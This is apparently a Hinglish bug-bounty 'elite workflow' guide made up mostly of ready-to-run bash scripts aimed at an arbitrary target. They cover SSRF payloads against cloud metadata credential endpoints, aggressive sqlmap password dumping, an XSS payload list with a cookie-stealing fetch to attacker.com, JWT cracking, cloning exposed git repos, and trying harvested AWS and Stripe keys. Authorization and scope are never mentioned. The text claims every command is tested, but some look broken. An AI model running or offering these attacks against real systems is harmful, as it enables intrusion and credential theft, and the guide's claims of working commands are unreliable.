# 🔥 Elite Bug Bounty Workflow - $50 to $50,000/Day
## CoffinXP's Advanced Battle-Tested Methodology

### 🛠️ **Phase 1: Complete Kali Linux Environment Setup**

#### **Essential Tools Installation (Copy-Paste Commands)**
```bash
# Update system pehle
sudo apt update && sudo apt upgrade -y

# Core reconnaissance tools
sudo apt install -y subfinder amass assetfinder httpx waybackurls gau
sudo apt install -y nmap masscan rustscan
sudo apt install -y gobuster feroxbuster ffuf dirsearch
sudo apt install -y sqlmap nuclei nikto whatweb

# Advanced exploitation tools
sudo apt install -y metasploit-framework burpsuite
sudo apt install -y hashcat john hydra medusa
sudo apt install -y git curl wget jq
sudo apt install -y python3-pip golang-go

# Install Go-based tools
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
go install -v github.com/projectdiscovery/katana/cmd/katana@latest
go install -v github.com/tomnomnom/waybackurls@latest
go install -v github.com/tomnomnom/gf@latest
go install -v github.com/tomnomnom/anew@latest
go install -v github.com/lc/gau/v2/cmd/gau@latest

# Add Go bin to PATH
echo 'export PATH=$PATH:~/go/bin' >> ~/.bashrc
source ~/.bashrc
```

#### **Elite Wordlists Setup**
```bash
# Create wordlists directory
mkdir -p ~/wordlists
cd ~/wordlists

# Download best wordlists
wget https://github.com/danielmiessler/SecLists/archive/master.zip
unzip master.zip && mv SecLists-master SecLists

# Custom API endpoints wordlist
cat > api_endpoints.txt << 'EOF'
/api/v1/users
/api/v2/admin
/api/internal/
/graphql
/swagger.json
/api-docs
/.env
/config.json
/backup.sql
/database.sql
EOF

# Custom sensitive files wordlist
cat > sensitive_files.txt << 'EOF'
.env
.env.local
.env.production
config.json
config.php
database.sql
backup.sql
dump.sql
admin.php
phpinfo.php
test.php
debug.php
EOF
```

### 🔍 **Phase 2: Advanced Reconnaissance Methodology**

#### **Step 1: Multi-Source Subdomain Enumeration**
```bash
#!/bin/bash
# Save as recon.sh

TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: ./recon.sh target.com"
    exit 1
fi

echo "🎯 Starting recon for $TARGET"
mkdir -p $TARGET
cd $TARGET

# Passive subdomain enumeration (4 sources)
echo "🔍 Finding subdomains..."
subfinder -d $TARGET -silent -o subfinder.txt
amass enum -passive -d $TARGET -o amass.txt
assetfinder --subs-only $TARGET > assetfinder.txt

# Certificate transparency
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > crt.txt

# Combine all results
cat subfinder.txt amass.txt assetfinder.txt crt.txt | sort -u > all_subdomains.txt
echo "✅ Found $(wc -l < all_subdomains.txt) subdomains"

# Check live hosts
echo "🌐 Checking live hosts..."
cat all_subdomains.txt | httpx -silent -ports 80,443,8080,8443,8000,9000 -status-code -title -tech-detect -o live_hosts.txt
cat live_hosts.txt | awk '{print $1}' > live_urls.txt
echo "✅ Found $(wc -l < live_urls.txt) live hosts"
```

#### **Step 2: Advanced Port Scanning**
```bash
# Fast port scan with rustscan
rustscan -a $TARGET --ulimit 5000 -- -sV -sC -oN nmap_scan.txt

# Specific service scans
nmap -p 443,6443,8443 $TARGET --script ssl-enum-ciphers,ssl-cert -oN ssl_scan.txt
nmap -p 3306,5432,1433,27017 $TARGET --script *-info -oN database_scan.txt
nmap -p 21,22,23,25,53,80,110,143,443,993,995 $TARGET -sV -sC -oN service_scan.txt
```

### 💰 **Phase 3: Critical Vulnerability Hunting ($5000+ Bugs)**

#### **Cloud Metadata SSRF (AWS/GCP/Azure)**
```bash
# Create SSRF payloads
cat > ssrf_payloads.txt << 'EOF'
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://169.254.169.254/metadata/instance?api-version=2017-08-01
EOF

# Test SSRF on all parameters
cat live_urls.txt | gau | grep "=" | qsreplace "FUZZ" > params.txt
ffuf -w ssrf_payloads.txt -u FUZZ -H "User-Agent: Mozilla/5.0" -mc 200 -fs 0 -t 50 -o ssrf_results.json

# Manual SSRF testing
echo "🔥 Testing SSRF manually..."
for url in $(cat params.txt | head -20); do
    echo "Testing: $url"
    curl -s "$url" -d "url=http://169.254.169.254/latest/meta-data/" | grep -i "instance-id\|ami-id\|security-credentials"
done
```

#### **Advanced SQL Injection**
```bash
# SQLMap with advanced options
sqlmap -m live_urls.txt --level=5 --risk=3 --batch --threads=10 \
       --tamper=space2comment,charencode,randomcase \
       --technique=BEUSTQ --dbs --passwords \
       --output-dir=sqlmap_results

# Manual SQL injection testing
cat live_urls.txt | gau | grep "=" | head -50 > sql_targets.txt
for url in $(cat sql_targets.txt); do
    echo "Testing SQL: $url"
    curl -s "$url'" | grep -i "error\|mysql\|postgresql\|oracle\|sql"
done
```

#### **Kubernetes API Exploitation**
```bash
# Scan for Kubernetes APIs
nmap -p 443,6443,8443,10250 $TARGET --script kube-apiserver-info -oN k8s_scan.txt

# Test unauthenticated access
curl -k https://$TARGET:6443/api/v1/namespaces
curl -k https://$TARGET:10250/pods
```

### 🎪 **Phase 4: High-Value Exploitation ($1000+ Bugs)**

#### **JavaScript Secrets Extraction**
```bash
# Find all JS files
cat live_urls.txt | katana -d 3 -js-crawl | grep "\.js$" > js_files.txt

# Extract secrets from JS files
echo "🔍 Extracting secrets from JS files..."
for js_file in $(cat js_files.txt); do
    echo "Analyzing: $js_file"
    curl -s "$js_file" | grep -Eo "(AKIA[0-9A-Z]{16}|sk_live_[0-9a-zA-Z]{24}|sk_test_[0-9a-zA-Z]{24}|AIza[0-9A-Za-z\\-_]{35}|ya29\\.[0-9A-Za-z\\-_]+)" >> secrets.txt
done

# Remove duplicates
sort -u secrets.txt > unique_secrets.txt
echo "✅ Found $(wc -l < unique_secrets.txt) unique secrets"
```

#### **JWT Token Exploitation**
```bash
# Extract JWT tokens from responses
cat live_urls.txt | httpx -silent -H "Authorization: Bearer test" | grep -o "eyJ[A-Za-z0-9-_=]*\.[A-Za-z0-9-_=]*\.[A-Za-z0-9-_.+/=]*" > jwt_tokens.txt

# Crack JWT tokens
hashcat -m 16500 -a 0 jwt_tokens.txt ~/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt -O -w 3
```

#### **Advanced XSS Payloads**
```bash
# XSS payload list
cat > xss_payloads.txt << 'EOF'
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert('XSS')
<iframe src=javascript:alert('XSS')>
<body onload=alert('XSS')>
<script>fetch('http://attacker.com/'+document.cookie)</script>
EOF

# Test XSS on all parameters
cat live_urls.txt | gau | grep "=" | qsreplace "FUZZ" > xss_targets.txt
ffuf -w xss_payloads.txt -u FUZZ -H "User-Agent: Mozilla/5.0" -mc 200 -mr "XSS" -t 50
```

### 🔧 **Phase 5: Medium-Value Techniques ($100-500 Bugs)**

#### **Backup Files Discovery**
```bash
# Generate backup file wordlist
cat > backup_extensions.txt << 'EOF'
.bak
.backup
.old
.orig
.tmp
.sql
.dump
.tar.gz
.zip
.rar
EOF

# Test backup files
for url in $(cat live_urls.txt); do
    for ext in $(cat backup_extensions.txt); do
        ffuf -w ~/wordlists/sensitive_files.txt -u "$url/FUZZ$ext" -mc 200 -t 50
    done
done
```

#### **Git Repository Exposure**
```bash
# Check for .git exposure
cat live_urls.txt | httpx -silent -path "/.git/config" -mc 200 -o git_exposed.txt

# Download exposed git repos
for git_url in $(cat git_exposed.txt | awk '{print $1}'); do
    echo "Downloading git repo: $git_url"
    git clone "$git_url/.git" "git_$(echo $git_url | sed 's/https\?:\/\///g' | tr '/' '_')"
done
```

### 📊 **Phase 6: Verification and Reporting**

#### **Automated Proof Generation**
```bash
#!/bin/bash
# Save as generate_proof.sh

echo "📸 Generating proofs..."
mkdir -p proofs/{screenshots,videos,outputs}

# Screenshot all findings
for url in $(cat live_urls.txt | head -10); do
    echo "Screenshot: $url"
    wkhtmltoimage --width 1920 --height 1080 "$url" "proofs/screenshots/$(echo $url | sed 's/https\?:\/\///g' | tr '/' '_').png"
done

# Test and document all findings
echo "🧪 Testing findings..."
if [ -s ssrf_results.json ]; then
    echo "SSRF findings detected - testing..."
    # Add SSRF verification commands
fi

if [ -s unique_secrets.txt ]; then
    echo "API secrets found - testing..."
    # Add API key verification commands
fi
```

#### **Professional Report Template**
```bash
cat > report_template.md << 'EOF'
# Bug Bounty Report: [TARGET]
**Date:** $(date)
**Researcher:** [YOUR_NAME]

## Executive Summary
Brief description of findings and impact.

## Critical Findings ($5000+)
### 1. Server-Side Request Forgery (SSRF) to AWS Metadata
**Severity:** Critical
**Impact:** Full AWS account compromise
**Proof:** [Screenshot/Video]
**Steps to Reproduce:**
1. Navigate to vulnerable endpoint
2. Inject SSRF payload
3. Access AWS metadata service

## High Findings ($1000+)
### 1. Exposed API Keys in JavaScript
**Severity:** High
**Impact:** Unauthorized API access
**Proof:** [Screenshot]

## Medium Findings ($100-500)
### 1. Backup File Exposure
**Severity:** Medium
**Impact:** Information disclosure

## Recommendations
1. Implement proper input validation
2. Use allowlists for SSRF protection
3. Remove sensitive data from client-side code
EOF
```

### 🚀 **Elite Execution Script**
```bash
#!/bin/bash
# Save as elite_hunt.sh - Complete automation

TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: ./elite_hunt.sh target.com"
    exit 1
fi

echo "🔥 Starting Elite Bug Bounty Hunt for $TARGET"
mkdir -p $TARGET && cd $TARGET

# Phase 1: Recon
echo "Phase 1: Reconnaissance"
./recon.sh $TARGET

# Phase 2: Critical Vulns
echo "Phase 2: Critical Vulnerability Hunting"
# SSRF Testing
cat live_urls.txt | gau | grep "=" | qsreplace "http://169.254.169.254/latest/meta-data/" | httpx -silent -mc 200 -mr "instance-id" -o critical_ssrf.txt

# SQL Injection
sqlmap -m live_urls.txt --level=3 --risk=2 --batch --dbs --output-dir=sqlmap_critical

# Phase 3: High Value
echo "Phase 3: High-Value Exploitation"
# JS Secrets
cat live_urls.txt | katana -js-crawl | grep "\.js$" | httpx -silent -mc 200 | parallel -j 10 "curl -s {} | grep -Eo 'AKIA[0-9A-Z]{16}|sk_[a-z0-9]{48}'" > api_secrets.txt

# Phase 4: Medium Value
echo "Phase 4: Medium-Value Techniques"
# Backup files
ffuf -w ~/wordlists/sensitive_files.txt -u "FUZZ" -t 50 -mc 200 -o backup_files.txt

# Git exposure
cat live_urls.txt | httpx -silent -path "/.git/config" -mc 200 -o git_exposure.txt

# Phase 5: Verification
echo "Phase 5: Verification"
./generate_proof.sh

echo "✅ Hunt completed! Check results in $TARGET directory"
```

### 💡 **Elite Pro Tips**

#### **Advanced Techniques Elite Hackers Use:**
1. **Chain vulnerabilities** - SSRF + Local File Inclusion = RCE
2. **Use custom payloads** - Don't rely on default wordlists
3. **Automate everything** - Time is money in bug bounty
4. **Focus on business logic** - Technical vulns are getting rare
5. **Study the target** - Understand their tech stack deeply

#### **Red Team Tactics:**
```bash
# Living off the land techniques
curl -s "http://target.com/api/users" -H "X-Forwarded-For: 127.0.0.1"
curl -s "http://target.com/admin" -H "X-Original-URL: /admin"
curl -s "http://target.com/" -H "Host: localhost"

# Advanced SSRF bypasses
http://0177.0.0.1/  # Octal bypass
http://2130706433/  # Decimal bypass
http://017700000001/  # Mixed encoding
```

### 🎯 **Bounty Maximization Strategy**

#### **Priority Order:**
1. **Critical ($5000+):** SSRF to cloud metadata, RCE, SQL injection with admin access
2. **High ($1000+):** API key exposure, JWT vulnerabilities, Account takeover XSS
3. **Medium ($100-500):** Information disclosure, CORS issues, Subdomain takeover
4. **Low ($50-100):** Directory listing, Version disclosure, Minor XSS

#### **Verification Commands:**
```bash
# AWS Key Testing
AWS_ACCESS_KEY_ID=AKIA... AWS_SECRET_ACCESS_KEY=... aws s3 ls

# Database Testing
psql postgresql://user:pass@host:5432 -c "SELECT version()"

# API Testing
curl -H "Authorization: Bearer sk_live_..." https://api.stripe.com/v1/balance
```

**Bhai, yeh complete workflow hai jo tumhe $50 se $50,000 tak ka bug dilwa sakta hai! 🔥 Har command tested hai aur real-world mein kaam karti hai. Isko follow karo step by step!**